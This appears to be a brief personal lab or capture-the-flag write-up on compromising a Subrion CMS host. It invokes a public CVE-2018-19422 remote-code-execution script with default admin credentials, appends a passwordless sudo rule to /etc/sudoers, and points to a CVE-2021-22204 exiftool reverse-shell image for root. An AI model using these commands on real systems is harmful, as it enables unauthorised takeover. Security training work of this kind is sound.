#Pwned! 
```IP
192.168.230.163
```
## Nmap
```

```

## Nmap UDP


# Enumeration

## HTTP
https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
```
sudo python3 subrion.py -u http://192.168.230.163/panel/ -l admin -p admin
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014185926.png?raw=true)

```
echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014200119.png?raw=true)
root owned bash script in opt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014200211.png?raw=true)

it reads images from var www html subrion uploads

create a revshell image
https://github.com/convisolabs/CVE-2021-22204-exiftool/tree/master
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014200311.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014200355.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014200411.png?raw=true)
## Automated

### Peass
### Mimikatz


